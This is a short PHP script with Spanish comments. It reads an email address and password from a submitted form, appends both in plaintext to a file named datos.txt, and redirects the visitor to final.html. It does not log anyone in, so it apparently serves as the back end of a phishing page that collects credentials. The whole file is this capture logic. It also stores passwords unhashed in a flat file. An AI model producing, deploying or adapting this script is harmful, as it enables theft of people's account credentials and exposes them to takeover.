<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger los datos del formulario
    $email = htmlspecialchars($_POST["email"]);
    $password = htmlspecialchars($_POST["password"]);

    // Crear o abrir el archivo datos.txt para agregar datos
    $archivo = fopen("datos.txt", "a");

    if ($archivo) {
        // Formatear y guardar los datos
        $linea = "Email: $email | Contraseña: $password" . PHP_EOL;
        fwrite($archivo, $linea); // Escribir datos en el archivo
        fclose($archivo); // Cerrar el archivo

        // Redirigir a final.html
        header("Location: final.html");
        exit(); // Detener la ejecución después de la redirección
    } else {
        echo "No se pudo guardar los datos.";
    }
} else {
    echo "Acceso no permitido.";
}
?>